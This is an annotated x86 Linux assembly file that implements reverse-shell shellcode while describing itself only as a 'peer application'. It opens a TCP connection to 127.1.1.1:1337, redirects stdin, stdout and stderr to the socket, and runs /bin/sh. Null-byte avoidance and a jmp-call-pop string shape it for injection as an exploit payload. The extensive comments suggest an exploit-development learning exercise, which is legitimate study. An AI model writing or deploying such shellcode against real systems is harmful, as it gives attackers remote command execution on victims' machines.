; Author: @bugsam
; Date: 06/26/2020
; Description: creates a peer application to communicates with a peer socket.
; Reference:
;               [1] socketcall(2)
;               [2] socket(2)
;               [3] ip(7)
;               [4] dup(2)
;               [5] execve(2)
;               [6] i386-linux-gnu/asm/unistd_32.h
;               [7] linux/net.h
;               [8] i386-linux-gnu/bits/socket.h
;               [9] i386-linux-gnu/bits/socket_type.h
;               [10] linux/in.h
;               [11] socket(7)
;               [12] Intel® 64 and IA-32 Architectures Software Developer’s Manual
;               [13] i386-linux-gnu/sys/socket.h

; Further information:
;               [] Professional Linux Kernel Architecture, Ch.12. MAUERER, Wolfgang
;               [] The Linux Programmimg Interface, Ch.56. KERRISK, Michael

global _start
_start:
        ; The common kernel entry point to use socket system calls is SYS_SOCKETCALL [7].
        ; System call table [6] defined SYS_SOCKET as 0x66.
        xor eax, eax
        mov al, 0x66

        ; SYS_SOCKETCALL api receives two arguments in its constructor, the first is an 
        ; index for the desired socket. The second is a pointer to a list of arguments,
        ; passed to the chosen socket. For opening a peer comunication, we will use the
        ; SYS_SOCKET (defined as 1 in [7]).
        ; short explanation: call SYS_SOCKET, and get a file descriptor
        ;                    socket(AF_INET, SOCK_STREAM, IPPROTO_IP) 
        ;                    socketcall(SYS_SOCKET,*args)
        xor ebx, ebx
        inc ebx                 ; (call <- 1 (SYS_SOCKET))

        ; The SYS_SOCKET constructor receives three arguments, the first (domain) is an
        ; index for the AF (ADDRESS FAMILIY) index. Next we have the type (see [9]), 
        ; which indicates how the communication will operate. Finally, protocol another
        ; index to the given protocol [10].
        xor edx, edx            ; (EDX <- 0x0)
        push edx                ; *args[2] protocol <- 0 (IPPROTO_IP)
        push 0x1                ; *args[1] type <- 1 (SOCK_STREAM)
        push 0x2                ; *args[0] domain <- 2 (AF_INET or PF_INET) 

        mov ecx, esp            ; (ECX -> *args[0]) *args of SYS_SOCKETCALL
        int 0x80                ; call SYS_SOCKETCALL w/ SYS_SOCKET arguments
                                ; (w/out ERROR returns EAX <- socketfd)

        ; The inet library [10] contains a struct sockaddr_in that implements an Internet 
        ; Protocol socket address. As defined in [11] this struct works in a polymorphic
        ; manner being compatible with differents families and providing support to many 
        ; system calls. The sockaddr_in waits three members, the sin_family which is a 
        ; integer value [8] that determines the protocol family, the sin_port which is a
        ; 16-bit port number in network byte order, and sin_addr a 32-bit address number
        ; also in network byte order.
        ; short explanation: build socket struct
        push 0x0101017f         ; sin_addr <- 127.1.1.1 (7f010101)
        mov ecx, 0x3905         ; sin_port <- 0539 (1337)
        shl ecx, 0x10           ; shift 16 bits (avoids NULL-byte)
        mov cl, 0x02            ; sa_family <- 2 (AF_INET)
        push ecx                ; 0x39050002 (sin_port,sa_family)

        ; SYS_CONNECT specified in [13], receives three arguments in its constructor, the 
        ; first is a file descriptor for a socket (fd), next we have a pointer to the 
        ; address of the sockaddr_in struct (addr), last we have the length of the sockaddr
        ; struct (len).
        ; short explanation: connect to the socket
        ;                    connect(fd, *sockaddr, sock_length)
        ;                    socketcall(SYS_CONNECT,*args)
        mov ebx, esp            ; (EBX -> pointer to sockaddr_in)
        push 0x10               ; len <- defined in SOCK_SIZE <- 0x10 [see 10]
        push ebx                ; addr <- memory address to the beginning of the struct
        push eax                ; (EAX <- socket file descriptor)

        mov ecx, esp            ; (ECX <- *args) second argument of SYS_SOCKETCALL

        ; SYS_CONNECT is defined as 3 in [7]
        xor ebx, ebx
        mov bl, 0x03            ; (EBX <- call) first argument of SYS_SOCKETCALL
        xor eax, eax
        mov al, 0x66            ; [6] define SYS_SOCKETCALL as 0x66
        int 0x80                ; call SYS_SOCKETCALL w/ SYS_CONNECT arguments

        ; The SYS_dup2 receives two arguments, the source file descriptor
        ; /* Duplicate FD to FD2, closing FD2 and making it open on the same file.  */
        ; extern int dup2 (int __fd, int __fd2) __THROW;

        xor ecx, ecx            ; (ECX <- STDIN) 
        pop ebx                 ; (EBX <- sockfd) 
        xor eax, eax
        mov al, 0x3f            ; [6] defined SYS_dup2 as 0x3f
        int 0x80                ; (w/out ERROR returns EAX <- new file descriptor)

        inc ecx                 ; (ECX <- STDOUT) 
                                ; (EBX <- sockfd) 
        xor eax, eax
        mov al, 0x3f            ; as the result of the first SYS_dup2 is saved in EAX,
                                ; we have to set it again
        int 0x80                 

        inc ecx                 ; (ECX <- STDERR) 
                                ; (EBX <- sockfd) 
        xor eax, eax
        mov al, 0x3f
        int 0x80

        jmp short get_bash
execve:
        pop esi                 ; ESI <- Return Instruction Pointer [check 12, Vl.1 Section 6.2]
        xor ebx, ebx
        lea ecx, [esi + 13]             ; ECX (argv[0]) memory address
        mov dword[esi], ecx             ; set pointer to first argument
        mov dword[esi + 4], ebx         ; set argv[1] NULL-dword
        mov byte[esi + 15], bl          ; set NULL-terminated character in string argv[0]

        lea edx, [esi + 4]              ; set *envp as NULL
        lea ecx, [esi]                  ; ECX (*argv), pointer to *argv[0]
        lea ebx, [esi + 8]              ; EBX (*pathname)

        xor eax, eax
        mov al, 0xb                     ; EAX (11) syscall EXECVE
        int 0x80

get_bash:
        call execve
        shell: db "ZZZZNNNN/bin/shN"
                                ; pointer to: *argv[0]: "sh",0
                                ; argv[1]: NULL
                                ; *pathname: /bin/sh

; SYS_SOCKETCALL(SYS_SOCKET)
; SYS_SOCKETCALL(SYS_CONNECT)
; DUP2(sock, STDIN)
; DUP2(sock, STDOUT)
; DUP2(sock, STDERR)
; execve(/bin/sh, argv, envp) 
